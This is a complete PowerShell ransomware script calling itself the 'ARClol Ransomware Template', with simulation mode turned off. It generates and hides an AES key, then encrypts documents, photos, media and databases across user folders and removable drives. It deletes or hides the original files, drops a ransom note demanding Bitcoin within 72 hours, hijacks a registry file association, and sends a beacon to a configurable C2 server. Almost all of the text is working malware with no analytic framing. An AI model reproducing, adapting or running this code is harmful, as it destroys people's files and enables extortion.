param(
    [string]$xzvcv = "http://localhost:3001",
    [string]$cxzvz = [System.Guid]::NewGuid().ToString(),
    [int]$vczxv = 30,
    [string]$zxcvx = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
)

$ErrorActionPreference = "SilentlyContinue"
$ProgressPreference = "SilentlyContinue"

# =============================================
# RANSOMWARE FUNCTIONALITY
# =============================================

# Global ransomware configuration
$script:EnableRansomware = $true
$script:SimulationMode = $false
$script:RansomwareKey = $null
$script:RansomwareIV = $null
$script:MachineID = "$env:COMPUTERNAME-$env:USERNAME"
$script:NotificationType = "popup"  # 'popup' or 'permanent'
$script:NotificationMessage = "Your files have been encrypted with ARClol ransomware. Contact support for recovery."
$script:NotificationTitle = "ARClol Ransomware Alert"

function Write-Log {
    param([string]$Message, [string]$Level = "INFO")
    $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    Write-Host "[$timestamp] [$Level] $Message"
}

function New-RansomwareKey {
    Write-Log "Generating ransomware encryption key..."
    
    try {
        # Generate 32-byte AES-256 key and 16-byte IV
        $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
        $keyBytes = New-Object byte[] 32
        $ivBytes = New-Object byte[] 16
        
        $rng.GetBytes($keyBytes)
        $rng.GetBytes($ivBytes)
        
        $script:RansomwareKey = [Convert]::ToBase64String($keyBytes)
        $script:RansomwareIV = [Convert]::ToBase64String($ivBytes)
        
        # Store key persistently
        Save-RansomwareKey
        
        Write-Log "Ransomware key generated successfully"
        return @{
            machine_id = $script:MachineID
            key = $script:RansomwareKey
            iv = $script:RansomwareIV
            timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss UTC'
        }
        
    } catch {
        Write-Log "Failed to generate ransomware key: $_" "ERROR"
        return $null
    }
}

function Save-RansomwareKey {
    try {
        # Store key in hidden file for persistence
        $keyFile = "$env:APPDATA\Microsoft\Windows\Themes\.cache"
        $keyData = @{
            machine_id = $script:MachineID
            key = $script:RansomwareKey
            iv = $script:RansomwareIV
            timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss UTC'
        }
        
        # Ensure directory exists
        $keyDir = Split-Path $keyFile -Parent
        if (-not (Test-Path $keyDir)) {
            New-Item -ItemType Directory -Path $keyDir -Force | Out-Null
        }
        
        # Save encrypted key data
        $keyData | ConvertTo-Json -Compress | Out-File $keyFile -Force -Encoding UTF8
        
        # Hide the file
        $fileItem = Get-Item $keyFile
        $fileItem.Attributes = $fileItem.Attributes -bor [System.IO.FileAttributes]::Hidden
        $fileItem.Attributes = $fileItem.Attributes -bor [System.IO.FileAttributes]::System
        
        Write-Log "Ransomware key saved persistently"
        
    } catch {
        Write-Log "Failed to save ransomware key: $_" "ERROR"
    }
}

function Load-RansomwareKey {
    try {
        $keyFile = "$env:APPDATA\Microsoft\Windows\Themes\.cache"
        
        if (Test-Path $keyFile) {
            $keyData = Get-Content $keyFile | ConvertFrom-Json
            
            $script:RansomwareKey = $keyData.key
            $script:RansomwareIV = $keyData.iv
            
            Write-Log "Ransomware key loaded from persistent storage"
            return $true
        }
        
        return $false
        
    } catch {
        Write-Log "Failed to load ransomware key: $_" "ERROR"
        return $false
    }
}

function Get-TargetDirectories {
    $targetDirs = @()
    
    # User profile directories
    $userDirs = @(
        "$env:USERPROFILE\Documents",
        "$env:USERPROFILE\Pictures", 
        "$env:USERPROFILE\Desktop",
        "$env:USERPROFILE\Downloads",
        "$env:USERPROFILE\Music",
        "$env:USERPROFILE\Videos"
    )
    
    foreach ($dir in $userDirs) {
        if (Test-Path $dir) {
            $targetDirs += $dir
        }
    }
    
    # Check for removable drives
    try {
        $drives = Get-WmiObject -Class Win32_LogicalDisk | Where-Object { $_.DriveType -eq 2 }
        foreach ($drive in $drives) {
            if (Test-Path $drive.DeviceID) {
                $targetDirs += $drive.DeviceID
            }
        }
    } catch {}
    
    return $targetDirs
}

function Get-TargetExtensions {
    return @(
        '.doc', '.docx', '.docm', '.dot', '.dotx', '.dotm',
        '.xls', '.xlsx', '.xlsm', '.xlt', '.xltx', '.xltm',
        '.ppt', '.pptx', '.pptm', '.pot', '.potx', '.potm',
        '.pdf', '.rtf', '.odt', '.ods', '.odp',
        '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.svg',
        '.mp3', '.wav', '.flac', '.aac', '.m4a',
        '.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv',
        '.zip', '.rar', '.7z', '.tar', '.gz',
        '.txt', '.csv', '.json', '.xml', '.log',
        '.ps1', '.bat', '.cmd', '.vbs',
        '.sql', '.db', '.sqlite', '.mdb',
        '.psd', '.ai', '.sketch', '.fig'
    )
}

function Encrypt-File {
    param([string]$FilePath)
    
    try {
        $fileInfo = Get-Item $FilePath -ErrorAction Stop
        
        # Skip files larger than 100MB to avoid long processing times
        if ($fileInfo.Length -gt 100MB) {
            return @{ success = $false; error = "File too large" }
        }
        
        # Skip already encrypted files
        if ($fileInfo.Name.EndsWith('.ARClol')) {
            return @{ success = $false; error = "Already encrypted" }
        }
        
        # Use ARClol extension
        $encryptedPath = [System.IO.Path]::ChangeExtension($FilePath, "ARClol")
        
        if ($script:SimulationMode) {
            # Simulation mode - just copy file
            Copy-Item $FilePath $encryptedPath -Force
            Write-Log "Simulated encryption: $($fileInfo.Name)"
            return @{ success = $true; encrypted_path = $encryptedPath }
        }
        
        # Real encryption mode with header corruption
        $keyBytes = [Convert]::FromBase64String($script:RansomwareKey)
        $ivBytes = [Convert]::FromBase64String($script:RansomwareIV)
        
        # Read original file with retry logic and shared access
        $originalBytes = $null
        $maxRetries = 5
        $baseDelay = 100  # milliseconds
        
        for ($attempt = 1; $attempt -le $maxRetries; $attempt++) {
            try {
                # Use FileStream with shared read/write/delete access
                $fileStream = New-Object System.IO.FileStream(
                    $FilePath,
                    [System.IO.FileMode]::Open,
                    [System.IO.FileAccess]::Read,
                    ([System.IO.FileShare]::ReadWrite -bor [System.IO.FileShare]::Delete)
                )
                
                # Read the file's bytes into memory
                $originalBytes = New-Object byte[] $fileStream.Length
                $fileStream.Read($originalBytes, 0, $fileStream.Length)
                
                $fileStream.Close()
                $fileStream.Dispose()
                
                Write-Log "Successfully read file on attempt $attempt`: $($fileInfo.Name)"
                break
                
            } catch [System.IO.IOException] {
                if ($attempt -eq $maxRetries) {
                    Write-Log "Failed to read file after $maxRetries attempts: $($fileInfo.Name) - $($_.Exception.Message)" "ERROR"
                    return @{ success = $false; error = "File access failed after retries: $($_.Exception.Message)" }
                }
                
                # Exponential backoff: 100ms, 200ms, 400ms, 800ms, 1600ms
                $delay = $baseDelay * [Math]::Pow(2, $attempt - 1)
                Write-Log "File locked, retry $attempt/$maxRetries in ${delay}ms`: $($fileInfo.Name)" "WARN"
                Start-Sleep -Milliseconds $delay
            }
        }
        
        if (-not $originalBytes) {
            return @{ success = $false; error = "Failed to read file data" }
        }
        
        $headerSize = [Math]::Min(1024, $originalBytes.Length)
        $originalHeader = $originalBytes[0..($headerSize-1)]
        
        # Create magic header for corruption
        $magicHeader = [System.Text.Encoding]::UTF8.GetBytes("ARClol_ENCRYPTED_FILE_v1.0")
        $paddedMagic = New-Object byte[] $headerSize
        [Array]::Copy($magicHeader, 0, $paddedMagic, 0, [Math]::Min($magicHeader.Length, $headerSize))
        
        # Fill remaining header space with random bytes
        $rng = [System.Security.Cryptography.RandomNumberGenerator]::Create()
        if ($headerSize -gt $magicHeader.Length) {
            $randomBytes = New-Object byte[] ($headerSize - $magicHeader.Length)
            $rng.GetBytes($randomBytes)
            [Array]::Copy($randomBytes, 0, $paddedMagic, $magicHeader.Length, $randomBytes.Length)
        }
        
        # Prepare encryption payload with original header embedded
        $payloadData = @{
            original_header = [Convert]::ToBase64String($originalHeader)
            original_size = $originalBytes.Length
            header_size = $headerSize
            file_name = $fileInfo.Name
            timestamp = (Get-Date).ToBinary()
            machine_id = $script:MachineID
        }
        
        $payloadJson = $payloadData | ConvertTo-Json -Compress
        $payloadBytes = [System.Text.Encoding]::UTF8.GetBytes($payloadJson)
        $payloadLength = [BitConverter]::GetBytes($payloadBytes.Length)
        
        # Combine: [4-byte length][payload][original file data]
        $combinedData = $payloadLength + $payloadBytes + $originalBytes
        
        # Encrypt the combined data
        $aes = New-Object System.Security.Cryptography.AesManaged
        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $aes.Key = $keyBytes
        $aes.IV = $ivBytes
        
        $encryptor = $aes.CreateEncryptor()
        $encryptedData = $encryptor.TransformFinalBlock($combinedData, 0, $combinedData.Length)
        
        # Write corrupted header + encrypted data with retry logic
        $outputWritten = $false
        for ($attempt = 1; $attempt -le $maxRetries; $attempt++) {
            try {
                $outputStream = [System.IO.File]::Create($encryptedPath)
                $outputStream.Write($paddedMagic, 0, $paddedMagic.Length)  # Corrupted header
                $outputStream.Write($encryptedData, 0, $encryptedData.Length)  # Encrypted payload
                $outputStream.Close()
                $outputWritten = $true
                break
                
            } catch [System.IO.IOException] {
                if ($attempt -eq $maxRetries) {
                    Write-Log "Failed to write encrypted file after $maxRetries attempts: $encryptedPath" "ERROR"
                    return @{ success = $false; error = "Failed to write encrypted file after retries" }
                }
                
                $delay = $baseDelay * [Math]::Pow(2, $attempt - 1)
                Write-Log "Output file write failed, retry $attempt/$maxRetries in ${delay}ms`: $encryptedPath" "WARN"
                Start-Sleep -Milliseconds $delay
            }
        }
        
        if (-not $outputWritten) {
            $aes.Dispose()
            $rng.Dispose()
            return @{ success = $false; error = "Failed to write encrypted file" }
        }
        
        $aes.Dispose()
        $rng.Dispose()
        
        # Attempt to remove the original file, but do NOT treat failure as a fatal error.
        try {
            for ($attempt = 1; $attempt -le $maxRetries; $attempt++) {
                try {
                    Remove-Item $FilePath -Force
                    break
                } catch {
                    if ($attempt -eq $maxRetries) {
                        Write-Log "Failed to remove original file after $maxRetries attempts: $FilePath" "WARN"
                        break
                    }
                    
                    $delay = $baseDelay * [Math]::Pow(2, $attempt - 1)
                    Write-Log "Original file removal failed, retry $attempt/$maxRetries in ${delay}ms`: $FilePath" "WARN"
                    Start-Sleep -Milliseconds $delay
                }
            }
        } catch {
            Write-Log "Unhandled error while removing original file (ignored): $_" "WARN"
        }
         
        # Fallback: if the original file is still present, hide or rename it so it is no longer visible to the user
        try {
            if (Test-Path $FilePath) {
                $hiddenPath = "$FilePath.hidden"
                Rename-Item $FilePath $hiddenPath -Force
                (Get-Item $hiddenPath).Attributes = [System.IO.FileAttributes]::Hidden -bor [System.IO.FileAttributes]::System
            }
        } catch {
            Write-Log "Failed to hide original file: $FilePath" "WARN"
        }
        
        Write-Log "Successfully encrypted: $($fileInfo.Name)"
        return @{ success = $true; encrypted_path = $encryptedPath; original_size = $originalBytes.Length }
        
    } catch {
        Write-Log "Failed to encrypt $FilePath : $_" "ERROR"
        return @{ success = $false; error = $_.Exception.Message }
    }
}

function Write-RansomNote {
    param([string]$Directory)
    
    $noteFile = "$Directory\READ_ME_RESTORE_FILES.txt"
    
    # Don't overwrite existing notes
    if (Test-Path $noteFile) {
        return
    }
    
    $noteContent = @"
==================================================
YOUR FILES HAVE BEEN ENCRYPTED
==================================================

Your important files have been encrypted with military-grade AES-256 encryption.
This includes documents, pictures, videos, databases and other important files.

WHAT HAPPENED?
Your files are not damaged! They are just encrypted.

Your computer has been infected with ARClol ransomware.
All files have been encrypted and given the .ARClol extension.

HOW TO RECOVER YOUR FILES:
1. Download and install Tor Browser from: https://www.torproject.org/
2. Visit our recovery website: [REDACTED]
3. Enter your Machine ID: $script:MachineID
4. Follow the payment instructions

IMPORTANT:
- Do NOT rename encrypted files
- Do NOT use third-party decryption tools
- Do NOT restart your computer
- Do NOT attempt to decrypt files yourself

Your unique decryption key is stored securely and will be provided after payment.

Payment must be made in Bitcoin (BTC) within 72 hours.
After 72 hours, the decryption key will be permanently deleted.

For support, email: recovery@[REDACTED].com
Include your Machine ID: $script:MachineID

==================================================
Machine: $script:MachineID
Generated: $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss UTC')
==================================================
"@
    
    try {
        $noteContent | Out-File -FilePath $noteFile -Encoding UTF8 -Force
        Write-Log "Ransom note written to: $Directory"
    } catch {
        Write-Log "Failed to write ransom note to $Directory : $_" "ERROR"
    }
}

function Register-ARClolFileAssociation {
    try {
        Write-Log "Registering .ARClol file association" "INFO"
        
        # Register the file extension
        $regPath = "HKCU:\Software\Classes\.ARClol"
        New-Item -Path $regPath -Force | Out-Null
        Set-ItemProperty -Path $regPath -Name "(Default)" -Value "ARClolFile"
        
        # Register the file type
        $regPath = "HKCU:\Software\Classes\ARClolFile"
        New-Item -Path $regPath -Force | Out-Null
        Set-ItemProperty -Path $regPath -Name "(Default)" -Value "ARClol Encrypted File"
        
        # Register the shell command for popup notification
        $regPath = "HKCU:\Software\Classes\ARClolFile\shell\open\command"
        New-Item -Path $regPath -Force | Out-Null
        
        # PowerShell command to show notification based on type
        $escapedMessage = $script:NotificationMessage -replace "'", "''"
        $escapedTitle = $script:NotificationTitle -replace "'", "''"
        
        # Create a simple command script file instead of complex inline escaping
        $commandPath = Join-Path $env:TEMP "ARClol_notification.ps1"
        
        if ($script:NotificationType -eq 'popup') {
            $notificationScript = @"
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.MessageBox]::Show('$escapedMessage', '$escapedTitle', [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning)
"@
        } else {
            $notificationScript = @"
Add-Type -AssemblyName System.Windows.Forms
`$form = New-Object System.Windows.Forms.Form
`$form.Text = '$escapedTitle'
`$form.Size = New-Object System.Drawing.Size(500, 300)
`$form.StartPosition = "CenterScreen"
`$form.Topmost = `$true
`$form.ControlBox = `$false
`$label = New-Object System.Windows.Forms.Label
`$label.Text = '$escapedMessage'
`$label.AutoSize = `$true
`$label.Location = New-Object System.Drawing.Point(20, 20)
`$form.Controls.Add(`$label)
`$form.Add_Shown({`$form.Activate()})
`$form.ShowDialog() | Out-Null
"@
        }
        
        $notificationScript | Out-File -FilePath $commandPath -Encoding UTF8
        $psCommand = "powershell.exe -WindowStyle Hidden -File `"$commandPath`""
        Set-ItemProperty -Path $regPath -Name "(Default)" -Value $psCommand
        
        Write-Log "ARClol file association registered successfully" "INFO"
        return $true
    }
    catch {
        Write-Log "Failed to register ARClol file association: $($_.Exception.Message)" "ERROR"
        return $false
    }
}

function Show-RansomwareCompletionDialog {
    param(
        [int]$FilesEncrypted,
        [string]$MachineId,
        [string]$NotificationType = $script:NotificationType,
        [string]$NotificationMessage = $script:NotificationMessage,
        [string]$NotificationTitle = $script:NotificationTitle
    )
    
    try {
        if ($NotificationType -eq 'permanent') {
            # Show permanent window
            $psCommand = "powershell.exe -WindowStyle Normal -NoExit -Command `"Add-Type -AssemblyName System.Windows.Forms; `$form = New-Object System.Windows.Forms.Form; `$form.Text = '$NotificationTitle'; `$form.Size = New-Object System.Drawing.Size(500, 300); `$form.StartPosition = 'CenterScreen'; `$form.Topmost = \$true; `$form.ControlBox = \$false; `$label = New-Object System.Windows.Forms.Label; `$label.Text = '$NotificationMessage'; `$label.AutoSize = \$true; `$label.Location = New-Object System.Drawing.Point(20, 20); `$form.Controls.Add(`$label); `$form.Add_Shown({`$form.Activate()}); `$form.ShowDialog() | Out-Null`""
            Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Normal -NoExit -Command `"$psCommand`"" -Verb RunAs
        } else {
            # Show popup dialog
            Add-Type -AssemblyName System.Windows.Forms
            [System.Windows.Forms.MessageBox]::Show(
                "$NotificationMessage`n`nFiles encrypted: $FilesEncrypted`nMachine ID: $MachineId",
                "$NotificationTitle",
                [System.Windows.Forms.MessageBoxButtons]::OK,
                [System.Windows.Forms.MessageBoxIcon]::Warning
            )
        }
        
        Write-Log "Completion dialog displayed" "INFO"
    }
    catch {
        Write-Log "Failed to show completion dialog: $($_.Exception.Message)" "ERROR"
    }
}

function Start-Ransomware {
    Write-Log "Starting ransomware execution..." "WARN"

    if ($script:SimulationMode) {
        Write-Log "Running in SIMULATION MODE. No files will be encrypted or deleted." "WARN"
    }

    $targetDirs = Get-TargetDirectories
    $targetExts = Get-TargetExtensions
    $encryptedCount = 0
    $processedDirs = @()

    Write-Log "Target directories: $($targetDirs.Count)"
    Write-Log "Target extensions: $($targetExts.Count)"

    # Use a queue for robust, manual recursive traversal
    $queue = [System.Collections.Queue]::new()
    $targetDirs | ForEach-Object { $queue.Enqueue($_) }

    while ($queue.Count -gt 0) {
        $currentDir = $queue.Dequeue()

        try {
            Write-Log "Processing directory: $currentDir"
            $foundFiles = $false

            # Get items non-recursively to handle errors gracefully
            $items = Get-ChildItem -Path $currentDir -ErrorAction SilentlyContinue

            foreach ($item in $items) {
                if ($item.PSIsContainer) {
                    # Add subdirectories to the queue for processing
                    $queue.Enqueue($item.FullName)
                } else {
                    # Check if the file matches the target criteria
                    if ($targetExts -contains $item.Extension.ToLower() -and -not $item.Name.EndsWith('.ARClol')) {
                        $encryptResult = Encrypt-File -FilePath $item.FullName
                        if ($encryptResult.success) {
                            $encryptedCount++
                            $foundFiles = $true
                        }
                    }
                }
            }

            # Write ransom note to this directory if files were encrypted here
            if ($foundFiles) {
                Write-RansomNote -Directory $currentDir
                if ($processedDirs -notcontains $currentDir) {
                    $processedDirs += $currentDir
                }
            }

        } catch {
            Write-Log "Error processing directory $currentDir`: $_" "ERROR"
        }
    }

    # Show completion dialog
    if ($encryptedCount -gt 0) {
        Show-RansomwareCompletionDialog -FilesEncrypted $encryptedCount -MachineId $script:MachineID
    }

    $result = @{
        encrypted_files = $encryptedCount
        processed_directories = $processedDirs
        machine_id = $script:MachineID
        timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss UTC'
    }

    Write-Log "Ransomware execution completed. Encrypted $encryptedCount files in $($processedDirs.Count) directories"
    return $result
}

# =============================================
# MAIN EXECUTION
# =============================================

# One-time beacon to C2 server on first launch
$beaconSent = $false
try {
    $beaconUrl = "$xzvcv/api/ransom/beacon"
    $beaconData = @{
        agent_id = $cxzvz
        machine_id = $script:MachineID
        timestamp = Get-Date -Format 'yyyy-MM-dd HH:mm:ss UTC'
        event = "ransomware_launch"
    } | ConvertTo-Json
    
    $webClient = New-Object System.Net.WebClient
    $webClient.Headers.Add("User-Agent", $zxcvx)
    $webClient.Headers.Add("Content-Type", "application/json")
    $response = $webClient.UploadString($beaconUrl, $beaconData)
    $beaconSent = $true
    Write-Log "Beacon sent to C2 server successfully"
} catch {
    Write-Log "Failed to send beacon to C2 server: $_" "WARN"
}

# Register file association for .ARClol files
Register-ARClolFileAssociation | Out-Null

Write-Log "PowerShell ARClol Ransomware Template starting..." "WARN"
Write-Log "Agent ID: $cxzvz"
Write-Log "C2 Server: $xzvcv"
Write-Log "Beacon Interval: $vczxv seconds"
Write-Log "Beacon sent: $beaconSent"

# Set notification parameters from command line arguments (if provided)
if ($args.Count -ge 1) { $script:NotificationType = $args[0] }
if ($args.Count -ge 2) { $script:NotificationMessage = $args[1] }
if ($args.Count -ge 3) { $script:NotificationTitle = $args[2] }

# Generate ransomware key if not already done
if (-not $script:RansomwareKey -or -not $script:RansomwareIV) {
    $keyResult = New-RansomwareKey
    if (-not $keyResult) {
        Write-Log "Failed to generate ransomware key - exiting" "ERROR"
        exit 1
    }
}

# Start ransomware execution
$ransomwareResult = Start-Ransomware

# Report results back to C2
if ($ransomwareResult) {
    Write-Log "Ransomware execution completed successfully"
    Write-Log "Encrypted files: $($ransomwareResult.encrypted_files)"
    Write-Log "Processed directories: $($ransomwareResult.processed_directories.Count)"
} else {
    Write-Log "Ransomware execution failed" "ERROR"
    exit 1
}
